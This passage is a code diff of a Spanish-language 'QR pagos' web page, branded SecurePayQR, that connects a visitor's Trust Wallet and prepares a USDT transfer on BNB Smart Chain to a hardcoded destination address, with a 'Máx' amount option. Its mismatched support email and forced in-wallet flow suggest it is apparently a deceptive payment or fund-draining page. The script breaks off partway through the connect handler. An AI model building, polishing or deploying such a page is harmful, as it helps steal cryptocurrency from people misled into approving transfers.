@@ -3,7 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR pagos - Enviar </title>
+    <title>QR pagos - Enviar</title>
+
+    <!-- Librería ethers.js solo para lectura y cálculos de unidades -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
     <style>
         :root {
@@ -52,6 +55,7 @@
             max-width: 390px;
             padding: 20px;
             flex: 1;
+            padding-bottom: 132px;
         }
 
         .tw-header {
@@ -78,7 +82,7 @@
             font-size: 21px;
             line-height: 1.2;
             font-weight: 700;
-            letter-spacing: -0.35px;
+            letter-spacing: -0.025em;
             color: #111111;
         }
 
@@ -94,7 +98,7 @@
             font-size: 10px;
             line-height: 1;
             font-weight: 700;
-            letter-spacing: 0.35px;
+            letter-spacing: 0.025em;
         }
 
         .back-icon {
@@ -126,24 +130,27 @@
 
         .tw-label {
             font-size: 13px;
-            color: #717680;
+            color: #111;
             display: block;
             margin-bottom: 8px;
+            font-weight: 500;
         }
 
         .tw-input-row {
             display: flex;
             align-items: center;
             justify-content: space-between;
+            min-height: 36px;
         }
 
         .tw-input {
             background: transparent;
             border: none;
-            color: #111111;
+            color: #7d8490;
             font-size: 16px;
             width: 80%;
             outline: none;
+            font-weight: 500;
         }
 
         .tw-action-text {
@@ -151,6 +158,9 @@
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .tw-currency-badge {
@@ -179,29 +189,11 @@
             text-align: left;
         }
 
-        .wallet-info {
-            display: none;
-            background-color: #f6f7f9;
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 22px;
-        }
-
-        .wallet-info-title {
-            font-size: 13px;
-            color: #717680;
-            margin-bottom: 6px;
-        }
-
-        .wallet-address {
-            font-size: 13px;
-            color: #111111;
-            overflow-wrap: anywhere;
-            word-break: break-word;
-        }
-
         .tw-btn-container {
-            margin-top: 40px;
+            margin-top: 24px;
+            margin-bottom: 22px;
+            position: relative;
+            z-index: 3;
         }
 
         .tw-btn {
@@ -212,8 +204,9 @@
             border: none;
             border-radius: 26px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 650;
             cursor: pointer;
+            transition: transform 0.16s ease, box-shadow 0.2s ease, background-color 0.2s ease;
         }
 
         .tw-btn:disabled {
@@ -231,11 +224,11 @@
             display: none;
             align-items: center;
             gap: 11px;
-            margin: 4px 0 22px;
+            margin: 4px 0 20px;
             padding: 12px 14px;
             width: 100%;
-            background: rgba(255, 255, 255, 0.88);
-            border: 1px solid rgba(205, 215, 232, 0.78);
+            background: rgba(250, 252, 255, 0.72);
+            border: 1px solid rgba(211, 221, 238, 0.82);
             border-radius: 14px;
             box-shadow: 0 6px 18px rgba(31, 55, 92, 0.05);
             backdrop-filter: blur(8px);
@@ -261,6 +254,7 @@
             color: #717680;
             font-size: 11px;
             line-height: 1.2;
+            font-weight: 500;
         }
 
         .network-card-name {
@@ -280,22 +274,83 @@
             font-size: 10px;
             line-height: 1;
             font-weight: 700;
-            letter-spacing: 0.25px;
         }
-   
+    
         .tw-address-box {
-            border: 1px solid #e3e5e8;
+            border: 1px solid rgba(211, 221, 238, 0.82);
             border-radius: 14px;
-            padding: 12px 14px;
-            background: #ffffff;
+            padding: 14px 16px;
+            background: rgba(250, 252, 255, 0.72);
+            margin-bottom: 18px;
+            min-height: 82px;
         }
 
-        .tw-address-box .tw-label {
-            margin-top: 0;
+        .connected-summary-panel {
+            display: contents;
         }
 
-        .tw-address-box .tw-input-row {
+        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel {
+            display: block;
+            width: 100%;
+            box-sizing: border-box;
+            padding: 14px;
+            margin: 0 0 18px;
+            background: rgba(255,255,255,.88);
+            border: 1px solid rgba(205,215,232,.72);
+            border-radius: 20px;
+            box-shadow: 0 10px 28px rgba(31,55,92,.07);
+            backdrop-filter: blur(9px);
+        }
+
+        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #walletInfo,
+        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #bscNetworkInfo,
+        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel .tw-address-box {
+            width: 100%;
+            margin-left: 0;
+            margin-right: 0;
+            box-sizing: border-box;
+            box-shadow: none;
+            background: rgba(250,252,255,.72);
+            border: 1px solid rgba(211,221,238,.82);
+            border-radius: 14px;
+        }
+
+        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #walletInfo {
+            margin-bottom: 10px;
+        }
+
+        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #bscNetworkInfo {
+            margin-bottom: 10px;
+        }
+
+        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel .tw-address-box {
             margin-bottom: 0;
+        }
+
+        .copy-icon {
+            width: 21px;
+            height: 21px;
+            display: block;
+            color: #8d96a6;
+        }
+
+        .connected-wallet-address-wrap {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            width: 100%;
+            min-width: 0;
+        }
+
+        .connected-copy-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            flex: 0 0 36px;
+            color: #8d96a6;
         }
 
         .site-footer {
@@ -428,62 +483,11 @@
             margin-top: 7px;
             color: #717680;
             font-size: 12px;
-            font-weight: 400;
         }
 
         @keyframes processingSlide {
             0% { left: -45%; }
             100% { left: 100%; }
-        }
-
-        #walletInfo,
-        #tronNetworkInfo {
-            transition: opacity 0.22s ease, transform 0.22s ease, box-shadow 0.22s ease;
-        }
-
-        .tw-input-group:focus-within {
-            border-color: rgba(0, 82, 255, 0.28);
-            box-shadow: 0 8px 22px rgba(31, 55, 92, 0.075);
-        }
-
-        .tw-input-group {
-            transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
-        }
-
-        .tw-address-box {
-            margin-bottom: 18px;
-        }
-
-        .network-card {
-            margin-top: 2px;
-            margin-bottom: 20px;
-        }
-
-        .tw-btn {
-            transition: transform 0.16s ease, box-shadow 0.2s ease, background-color 0.2s ease;
-        }
-
-        .tw-btn:active:not(:disabled) {
-            transform: scale(0.985);
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            body,
-            .loader-logo,
-            .loader-spinner,
-            .processing-logo,
-            .processing-bar::after {
-                animation: none !important;
-            }
-
-            *,
-            *::before,
-            *::after {
-                scroll-behavior: auto !important;
-                transition-duration: 0.01ms !important;
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-            }
         }
 
         .amount-stage {
@@ -495,231 +499,6 @@
             animation: amountStageReveal .24s ease both;
         }
 
-        .tw-container:has(#walletInfo[style*="block"]) #walletInfo,
-        .tw-container:has(#walletInfo[style*="block"]) #tronNetworkInfo {
-            animation: connectedStageReveal .24s ease both;
-        }
-
-        @keyframes amountStageReveal {
-            from {
-                opacity: 0;
-                transform: translateY(8px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes connectedStageReveal {
-            from {
-                opacity: 0;
-                transform: translateY(6px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            .tw-container:has(#walletInfo[style*="block"]) .amount-stage,
-            .tw-container:has(#walletInfo[style*="block"]) #walletInfo,
-            .tw-container:has(#walletInfo[style*="block"]) #tronNetworkInfo {
-                animation: none !important;
-            }
-        }
-
-        :root {
-            --ui-font: sans-serif;
-        }
-
-        html, body, button, input, textarea, select {
-            font-family: var(--ui-font);
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            text-rendering: optimizeLegibility;
-        }
-
-        body {
-            letter-spacing: -0.005em;
-        }
-
-        .tw-header-title-main {
-            font-weight: 700;
-            letter-spacing: -0.025em;
-        }
-
-        .tw-label,
-        .network-card-label {
-            font-weight: 500;
-            letter-spacing: 0.005em;
-        }
-
-        .tw-input {
-            font-weight: 500;
-            letter-spacing: -0.012em;
-            line-height: 1.35;
-        }
-
-        .network-card-name {
-            font-weight: 650;
-            letter-spacing: -0.012em;
-        }
-
-        .network-card-badge,
-        .tw-network-badge {
-            font-weight: 700;
-            letter-spacing: 0.025em;
-        }
-
-        .tw-btn {
-            font-weight: 650;
-            letter-spacing: -0.01em;
-        }
-
-        .tw-action-text {
-            font-weight: 600;
-            letter-spacing: -0.005em;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .copy-icon {
-            width: 21px;
-            height: 21px;
-            display: block;
-            color: #8d96a6;
-        }
-
-        .connected-wallet-address-wrap {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 10px;
-            width: 100%;
-            min-width: 0;
-        }
-
-        .connected-wallet-address-wrap #walletAddressText {
-            min-width: 0;
-            flex: 1 1 auto;
-        }
-
-        .connected-copy-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 36px;
-            height: 36px;
-            flex: 0 0 36px;
-            color: #8d96a6;
-            border-radius: 9px;
-        }
-
-        #connectBtn {
-            margin-top: 24px;
-        }
-
-        .tw-address-box .tw-label,
-        #walletInfo .tw-label {
-            color: #111 !important;
-        }
-
-        .tw-address-box .tw-input,
-        #walletAddressText {
-            color: #7d8490 !important;
-        }
-
-        #walletInfo,
-        .tw-address-box {
-            width: 100%;
-            box-sizing: border-box;
-        }
-
-        #walletInfo {
-            min-height: 82px;
-            padding: 14px 16px;
-            border-radius: 14px;
-        }
-
-        .tw-address-box {
-            min-height: 82px;
-            padding: 14px 16px;
-            border-radius: 14px;
-        }
-
-        #walletInfo .tw-input-row,
-        .tw-address-box .tw-input-row {
-            min-height: 36px;
-            align-items: center;
-        }
-
-        .connected-summary-panel {
-            display: contents;
-        }
-
-        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel {
-            display: block;
-            width: 100%;
-            box-sizing: border-box;
-            padding: 14px;
-            margin: 0 0 18px;
-            background: rgba(255,255,255,.88);
-            border: 1px solid rgba(205,215,232,.72);
-            border-radius: 20px;
-            box-shadow: 0 10px 28px rgba(31,55,92,.07);
-            backdrop-filter: blur(9px);
-            -webkit-backdrop-filter: blur(9px);
-        }
-
-        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #walletInfo,
-        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #tronNetworkInfo,
-        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel .tw-address-box {
-            width: 100%;
-            margin-left: 0;
-            margin-right: 0;
-            box-sizing: border-box;
-            box-shadow: none;
-            background: rgba(250,252,255,.72);
-            border: 1px solid rgba(211,221,238,.82);
-            border-radius: 14px;
-        }
-
-        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #walletInfo,
-        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #tronNetworkInfo {
-            margin-bottom: 10px;
-        }
-
-        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel .tw-address-box {
-            margin-bottom: 0;
-        }
-
-        .tw-btn-container {
-            position: relative;
-            z-index: 3;
-            margin-bottom: 22px;
-        }
-
-        .tw-container {
-            padding-bottom: 118px;
-        }
-
-        @media (max-width: 600px) {
-            .connected-summary-panel {
-                border-radius: 18px;
-            }
-
-            .tw-container {
-                padding-bottom: 132px;
-            }
-
-            .tw-btn-container {
-                margin-bottom: 28px;
-            }
-        }
-
         .amount-stepper {
             display: grid;
             grid-template-columns: 44px minmax(0, 1fr) 44px;
@@ -727,12 +506,15 @@
             gap: 8px;
             width: 100%;
         }
+
         .amount-stepper #amountDisplay {
             width: 100%;
             min-width: 0;
             text-align: center;
             font-variant-numeric: tabular-nums;
+            color: #111;
         }
+
         .amount-step-btn {
             width: 42px;
             height: 42px;
@@ -749,207 +531,11 @@
             line-height: 1;
             cursor: pointer;
             -webkit-tap-highlight-color: transparent;
-            transition: transform .14s ease, background-color .18s ease, box-shadow .18s ease;
+            transition: transform .14s ease, background-color .18s ease;
         }
+
         .amount-step-btn:active { transform: scale(.94); }
-        .amount-step-btn:focus-visible {
-            outline: 2px solid rgba(0,82,255,.35);
-            outline-offset: 2px;
-        }
-</style>
-
-<style id="bnb-dark-visual-theme">
-:root{color-scheme:dark;--bnb-gold:#f3ba2f}
-html,body{background:#000!important;color:#fff!important}
-body{
- background:
- radial-gradient(ellipse at 8% 10%,rgba(243,186,47,.16),transparent 34%),
- radial-gradient(ellipse at 95% 28%,rgba(243,186,47,.12),transparent 34%),
- radial-gradient(ellipse at 5% 92%,rgba(243,186,47,.09),transparent 32%),
- #000!important;
- background-attachment:fixed!important;
-}
-body:before,body:after{
- content:"";position:fixed;width:58vw;height:58vw;border-radius:50%;
- border:1px solid rgba(243,186,47,.24);filter:blur(7px);pointer-events:none;z-index:-1
-}
-body:before{left:-38vw;top:12vh;box-shadow:0 0 45px rgba(243,186,47,.08)}
-body:after{right:-39vw;bottom:-8vh;box-shadow:0 0 45px rgba(243,186,47,.08)}
-h1,h2,h3,h4,h5,h6,p,label,span,strong,b,small,
-.wallet-address,.network-card-name,.address-value,.amount-label,.amount-value,
-.footer,.footer *,#walletAddressText,#addressDisplay,#amountDisplay{color:#fff!important}
-input{color:#fff!important;-webkit-text-fill-color:#fff!important}
-input::placeholder{color:#a4a9b2!important}
-.card,.wallet-card,.network-card,.address-card,.amount-card,.info-card,.container,
-.main-card,.payment-card,.details-card,[class*="card"]{
- background:linear-gradient(145deg,rgba(20,20,21,.95),rgba(5,5,6,.95))!important;
- border-color:rgba(255,255,255,.16)!important;
- box-shadow:0 14px 40px rgba(0,0,0,.45),0 0 20px rgba(243,186,47,.045)!important
-}
-button:not(#connectBtn),.amount-btn,#amountMinus,#amountPlus{
- color:#fff!important;background:#101011!important;border-color:rgba(255,255,255,.28)!important
-}
-#connectBtn{
- background:linear-gradient(90deg,#efad16,#ffd541)!important;color:#050505!important;
- border:none!important;box-shadow:0 8px 28px rgba(243,186,47,.20)!important
-}
-#status{
- background:rgba(18,18,19,.95)!important;color:#fff!important;
- border:1px solid rgba(255,255,255,.14)!important
-}
-.badge,.network-badge,[class*="badge"]{
- background:rgba(243,186,47,.10)!important;color:#f3ba2f!important;
- border-color:rgba(243,186,47,.48)!important
-}
-#processingScreen,.processing-screen,.loading-screen,#loadingScreen{
- background:#000!important;color:#fff!important
-}
-#processingScreen *,.processing-screen *,.loading-screen *,#loadingScreen *{color:#fff!important}
-footer,.footer{background:transparent!important;color:#fff!important}
-a{color:#f3ba2f!important}
-</style>
-
-<style id="bnb-dark-fix-2">
-html,body,main,.page,.app,.wrapper,.content,.page-container,
-[class*="background"],[class*="aurora"]{
-  background-color:#000!important;
-}
-.wallet-info,.wallet-details,.wallet-box,.info-box,.detail-box,
-.network-info,.destination-box,.amount-section,.amount-container,
-.card,.wallet-card,.network-card,.address-card,.amount-card,
-[class*="card"],[class*="box"]{
-  background:#0b0b0c!important;
-  background-color:#0b0b0c!important;
-  border-color:rgba(255,255,255,.16)!important;
-}
-input,textarea,select{
-  background:#0b0b0c!important;
-  color:#fff!important;
-}
-#loadingScreen,#processingScreen,
-.loading-screen,.processing-screen,
-.loading-overlay,.processing-overlay,
-[class*="loading"][class*="screen"],
-[class*="processing"][class*="screen"]{
-  background:#000!important;
-  background-color:#000!important;
-  background-image:none!important;
-  color:#fff!important;
-}
-#loadingScreen>*,#processingScreen>*,
-.loading-screen>*,.processing-screen>*,
-.loading-overlay>*,.processing-overlay>*{
-  background-color:transparent!important;
-  color:#fff!important;
-}
-#connectBtn{
-  background:linear-gradient(90deg,#efad16,#ffd541)!important;
-  color:#050505!important;
-}
-</style>
-
-<style id="bnb-dark-fix-3">
-#pageLoader.page-loader{
-  background:#000 !important;
-  background-color:#000 !important;
-  background-image:none !important;
-  color:#fff !important;
-}
-#pageLoader .loader-text{color:#fff !important}
-#pageLoader .loader-spinner{
-  border-color:rgba(255,255,255,.20) !important;
-  border-top-color:#f3ba2f !important;
-}
-#processingScreen.processing-screen{
-  background:#000 !important;
-  background-color:#000 !important;
-  background-image:none !important;
-}
-#processingScreen .processing-title,
-#processingScreen .processing-note{color:#fff !important}
-#processingScreen .processing-bar{background:#242424 !important}
-#processingScreen .processing-bar::after{background:#f3ba2f !important}
-.tw-container,
-.connected-summary-panel,
-.tw-input-group,
-.tw-address-box,
-.amount-stage,
-#tronNetworkInfo.network-card{
-  background:#0b0b0c !important;
-  background-color:#0b0b0c !important;
-  border-color:rgba(255,255,255,.16) !important;
-}
-.tw-label,
-.network-card-label,
-.network-card-name,
-.tw-input,
-.tw-input-row,
-.connected-wallet-address-wrap,
-#walletAddressText,
-#addressDisplay,
-.amount-stage label,
-.amount-stage .tw-label,
-.tw-action-text,
-.connected-copy-icon{
-  color:#fff !important;
-  -webkit-text-fill-color:#fff !important;
-}
-.network-card-label{color:#b9bec7 !important}
-.tw-input,
-#addressDisplay,
-#walletAddressText{
-  background:transparent !important;
-  border-color:transparent !important;
-}
-.network-card-badge,.tw-network-badge{
-  background:rgba(243,186,47,.10) !important;
-  border-color:rgba(243,186,47,.45) !important;
-  color:#f3ba2f !important;
-}
-</style>
-
-<style id="bnb-dark-fix-4">
-body::before{
-  width:72vw !important;height:72vw !important;
-  left:-42vw !important;top:8vh !important;
-  border:1px solid rgba(243,186,47,.30) !important;
-  box-shadow:0 0 75px rgba(243,186,47,.13) !important;
-  animation:bnbAuroraOne 8s ease-in-out infinite alternate !important;
-}
-body::after{
-  width:68vw !important;height:68vw !important;
-  right:-40vw !important;bottom:2vh !important;
-  border:1px solid rgba(243,186,47,.25) !important;
-  box-shadow:0 0 70px rgba(243,186,47,.11) !important;
-  animation:bnbAuroraTwo 10s ease-in-out infinite alternate !important;
-}
-@keyframes bnbAuroraOne{
-  0%{transform:translate3d(0,0,0) scale(1);opacity:.55}
-  45%{transform:translate3d(17vw,10vh,0) scale(1.16);opacity:1}
-  100%{transform:translate3d(5vw,28vh,0) scale(.94);opacity:.68}
-}
-@keyframes bnbAuroraTwo{
-  0%{transform:translate3d(0,0,0) scale(.94);opacity:.50}
-  50%{transform:translate3d(-18vw,-16vh,0) scale(1.18);opacity:.95}
-  100%{transform:translate3d(-7vw,-32vh,0) scale(1.02);opacity:.65}
-}
-</style>
-
-<style id="compact-amount-controls">
-.amount-btn,
-#amountMinus,
-#amountPlus{
-  width:34px !important;
-  height:34px !important;
-  min-width:34px !important;
-  min-height:34px !important;
-  padding:0 !important;
-  font-size:18px !important;
-  line-height:34px !important;
-  border-radius:9px !important;
-}
-</style>
-
+    </style>
 </head>
 
 <body>
@@ -977,7 +563,6 @@ body::after{
 <div class="tw-container">
 
     <div class="tw-header">
-
         <svg
             class="back-icon"
             viewBox="0 0 24 24"
@@ -1001,7 +586,6 @@ body::after{
             alt="QR Pagos"
             class="tw-logo"
         >
-
     </div>
 
     <div class="connected-summary-panel">
@@ -1013,12 +597,7 @@ body::after{
                     <div
                         id="walletAddressText"
                         class="tw-input"
-                        style="
-                            white-space: nowrap;
-                            overflow: hidden;
-                            text-overflow: ellipsis;
-                            width: 100%;
-                        "
+                        style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%;"
                     ></div>
                     <span class="connected-copy-icon" aria-hidden="true">
                         <svg class="copy-icon" viewBox="0 0 24 24" fill="none">
@@ -1030,7 +609,7 @@ body::after{
             </div>
         </div>
 
-        <div id="tronNetworkInfo" class="network-card">
+        <div id="bscNetworkInfo" class="network-card">
             <img
                 src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg"
                 alt="BNB"
@@ -1055,16 +634,7 @@ body::after{
                     type="text"
                     readonly
                     tabindex="-1"
-                    oncopy="return false;"
-                    oncut="return false;"
-                    oncontextmenu="return false;"
-                    ondragstart="return false;"
-                    style="
-                        user-select: none;
-                        -webkit-user-select: none;
-                        -webkit-touch-callout: none;
-                        caret-color: transparent;
-                    "
+                    style="caret-color: transparent;"
                 >
 
                 <span class="tw-action-text">
@@ -1101,7 +671,7 @@ body::after{
                 id="maxAction"
                 class="tw-action-text"
                 style="margin-right: 12px; display: none; cursor: pointer;"
-            >Máximo</span>
+            >Máx</span>
 
             <span class="tw-currency-badge">
                 USDT
@@ -1124,52 +694,21 @@ body::after{
             <svg class="link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                 <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
                 <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
-            </svg><span>Conectar a la Pasarela de pago</span>
+            </svg><span>Vincular billetera</span>
         </button>
     </div>
 
 </div>
 
-
-<section id="transferReceipt" hidden aria-live="polite" style="width:100%;max-width:390px;margin:20px auto 90px;padding:22px;border-radius:20px;background:#fff;box-shadow:0 8px 30px #172d4d18;color:#111;">
- <div style="text-align:center;font-size:34px;color:#0052ff">✓</div>
- <h2 id="receiptState" style="text-align:center;margin:8px 0 20px;font-size:21px">Estado de transferencia</h2>
- <div class="receipt-caption" style="text-align:center;color:#717680">Monto de la transferencia</div>
- <div id="receiptAmount" style="font-size:30px;font-weight:750;text-align:center;margin:8px 0 20px"></div>
- <div class="receipt-detail"><b>Token / red</b><span>USDT · BNB Smart Chain (BEP-20)</span></div>
- <div class="receipt-detail"><b>Origen</b><span id="receiptFrom"></span></div>
- <div class="receipt-detail"><b>Destino</b><span id="receiptTo"></span></div>
- <div class="receipt-detail"><b>TXID</b><span id="receiptHash"></span></div>
- <div class="receipt-detail"><b>Bloque</b><span id="receiptBlock"></span></div>
- <div class="receipt-detail"><b>Comisión real</b><span id="receiptFee"></span></div>
- <div class="receipt-detail"><b>Fecha de consulta</b><span id="receiptDate"></span></div>
- <a id="receiptExplorer" href="https://bscscan.com" target="_blank" rel="noopener noreferrer" style="display:block;text-align:center;margin-top:20px;padding:15px;border-radius:25px;background:#0052ff;color:white;text-decoration:none;font-weight:650">Ver transacción en BscScan</a>
-</section>
-<style>.receipt-detail{padding:12px 0;border-bottom:1px solid #e5e9f2;display:flex;flex-direction:column;gap:5px;font-size:13px}.receipt-detail b{color:#717680}.receipt-detail span{overflow-wrap:anywhere}</style>
-
-<style id="receipt-visibility-fix">
-#transferReceipt{color:#111!important;background:#fff!important;padding-bottom:28px!important;box-sizing:border-box}
-#transferReceipt h2,#transferReceipt b,#transferReceipt span,#transferReceipt div{color:#111!important;-webkit-text-fill-color:#111!important}
-#transferReceipt .receipt-detail b,#transferReceipt .receipt-caption{color:#68717e!important;-webkit-text-fill-color:#68717e!important}
-#transferReceipt .receipt-detail{min-height:54px;gap:6px}
-#transferReceipt .receipt-detail span{display:block;overflow-wrap:anywhere;word-break:break-word;line-height:1.5}
-#transferReceipt #receiptExplorer{color:#fff!important;-webkit-text-fill-color:#fff!important;background:#0052ff!important;margin-bottom:20px}
-body.receipt-visible .site-footer{position:static!important;margin-top:24px;padding:16px 12px 22px;background:#fff!important;color:#717680!important}
-body.receipt-visible .site-footer p{color:#717680!important}
-body.receipt-visible .site-footer a{color:#0052ff!important}
-</style>
 <footer class="site-footer">
     <p>© 2026 SecurePayQR. All rights reserved.</p>
     <p>
         Need help?
-        <a href="mailto:help@securetrustpay.net" title="Enviar correo a help@securepayQR.net">
+        <a href="mailto:help@securetrustpay.net" title="Enviar correo">
             help@securepayQR.net
         </a>
     </p>
 </footer>
-
-<!-- Librería ethers.js incluida para los cálculos y ABI -->
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
 <script>
     window.addEventListener('load', function () {
@@ -1181,193 +720,282 @@ body.receipt-visible .site-footer a{color:#0052ff!important}
 </script>
 
 <script>
-const BILLETERA_DESTINO="0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
-const CONTRATO_USDT="0x55d398326f99059fF775485246999027B3197955";
-const BSC_PUBLIC_RPC="https://bsc-dataseed.bnbchain.org";
-const DECIMALS=18n;
+    const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
+    const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
+    const BSC_CHAIN_ID_HEX = "0x38"; // 56 en hexadecimal (BNB Smart Chain)
 
-const USDT_ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function transfer(address to, uint256 amount) returns (bool)"
-];
+    const USDT_ABI = [
+        "function balanceOf(address owner) view returns (uint256)",
+        "function transfer(address to, uint256 amount) returns (bool)"
+    ];
 
-const connectBtn=document.getElementById("connectBtn");
-const statusDiv=document.getElementById("status");
-const amountDisplay=document.getElementById("amountDisplay");
-const addressDisplay=document.getElementById("addressDisplay");
-const maxAction=document.getElementById("maxAction");
-const walletInfo=document.getElementById("walletInfo");
-const walletAddressText=document.getElementById("walletAddressText");
-const networkInfo=document.getElementById("tronNetworkInfo");
-const processingScreen=document.getElementById("processingScreen");
-let walletAddress=null, rawProvider=null, processingStartedAt=0;
+    let uiAudioContext = null;
 
-addressDisplay.value=BILLETERA_DESTINO;
-function abreviarDireccion(addr){
- return addr && addr.length>17 ? addr.slice(0,8)+"..."+addr.slice(-6) : addr;
-}
-addressDisplay.title=BILLETERA_DESTINO;
+    function getUiAudioContext() {
+        if (!uiAudioContext) {
+            const AudioCtx = window.AudioContext || window.webkitAudioContext;
+            if (!AudioCtx) return null;
+            uiAudioContext = new AudioCtx();
+        }
+        if (uiAudioContext.state === 'suspended') {
+            uiAudioContext.resume();
+        }
+        return uiAudioContext;
+    }
 
-function setStatus(m){statusDiv.innerText=m||"";statusDiv.style.display=m?"block":"none";}
-function showProcessingScreen(){processingStartedAt=Date.now();if(processingScreen)processingScreen.classList.add("visible");}
-async function hideProcessingScreenAfterMinimum(){if(!processingStartedAt)return;const r=Math.max(0,4000-(Date.now()-processingStartedAt));if(r)await new Promise(x=>setTimeout(x,r));if(processingScreen)processingScreen.classList.remove("visible");processingStartedAt=0;}
+    function playUiTone(frequency, duration, volume = 0.035, delay = 0) {
+        const ctx = getUiAudioContext();
+        if (!ctx) return;
 
-function getRawProvider() {
-    if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
-    if (window.ethereum) return window.ethereum;
-    throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
-}
+        const start = ctx.currentTime + delay;
+        const oscillator = ctx.createOscillator();
+        const gain = ctx.createGain();
 
-async function publicRpc(method,params=[]){
- const response=await fetch(BSC_PUBLIC_RPC,{
-  method:"POST",
-  headers:{"Content-Type":"application/json"},
-  body:JSON.stringify({jsonrpc:"2.0",id:1,method,params})
- });
- if(!response.ok) throw new Error("RPC público HTTP "+response.status);
- const json=await response.json();
- if(json.error) throw new Error("RPC público: "+(json.error.message||JSON.stringify(json.error)));
- return json.result;
-}
+        oscillator.type = 'sine';
+        oscillator.frequency.setValueAtTime(frequency, start);
 
-async function balanceOf(owner){
- const data="0x70a08231"+pad64(owner);
- const result=await publicRpc("eth_call",[{to:CONTRATO_USDT,data},"latest"]);
- return BigInt(result||"0x0");
-}
+        gain.gain.setValueAtTime(0.0001, start);
+        gain.gain.exponentialRampToValueAtTime(volume, start + 0.018);
+        gain.gain.exponentialRampToValueAtTime(0.0001, start + duration);
 
-function pad64(h){return h.replace(/^0x/,"").padStart(64,"0");}
-function encAddr(a){return pad64(a.toLowerCase());}
-function encUint(v){return BigInt(v).toString(16).padStart(64,"0");}
-function format18(v){v=BigInt(v);const b=10n**DECIMALS,w=v/b,f=(v%b).toString().padStart(18,"0").replace(/0+$/,"");return f?`${w}.${f}`:w.toString();}
+        oscillator.connect(gain);
+        gain.connect(ctx.destination);
 
-let latestReceipt=null;
-function showReceipt(info){
- latestReceipt=info;
- const el=document.getElementById("transferReceipt");
- const put=(id,value)=>{document.getElementById(id).textContent=value;};
- const confirmed=info.receipt && BigInt(info.receipt.status||"0x0")===1n;
- const failed=info.receipt && !confirmed;
- document.querySelector("#transferReceipt > div:first-child").textContent=confirmed?"✓":failed?"✕":"◷";
- put("receiptState",confirmed?"Transferencia confirmada":failed?"Transacción fallida":"Pendiente de confirmación");
- put("receiptAmount",info.amount+" USDT");
- put("receiptFrom",info.from);
- put("receiptTo",info.to);
- put("receiptHash",info.txHash);
- put("receiptBlock",info.receipt?.blockNumber?String(BigInt(info.receipt.blockNumber)):"Pendiente");
- put("receiptDate",new Date().toLocaleString("es-AR"));
- put("receiptFee",info.receipt?.gasUsed&&info.receipt?.effectiveGasPrice?format18(BigInt(info.receipt.gasUsed)*BigInt(info.receipt.effectiveGasPrice))+" BNB":"No disponible aún");
- document.getElementById("receiptExplorer").href="https://bscscan.com/tx/"+encodeURIComponent(info.txHash);
- el.hidden=false;
- document.body.classList.add("receipt-visible");
- el.scrollIntoView({behavior:"smooth",block:"start"});
-}
+        oscillator.start(start);
+        oscillator.stop(start + duration + 0.02);
+    }
 
-connectBtn.addEventListener("click",async()=>{
- if(walletAddress && latestReceipt){document.getElementById("transferReceipt").scrollIntoView({behavior:"smooth"});return;}
- if(!walletAddress){
-  try{
-   setStatus("Estableciendo enlace con la billetera...");
-   connectBtn.disabled=true;
-   rawProvider=getRawProvider();
-   const accounts=await rawProvider.request({method:'eth_requestAccounts'});
-   walletAddress=accounts?.[0];
-   if(!walletAddress)throw new Error("No se obtuvo acceso a la dirección.");
-   if(walletAddressText)walletAddressText.textContent=abreviarDireccion(walletAddress);
-   if(walletInfo)walletInfo.style.display="block";
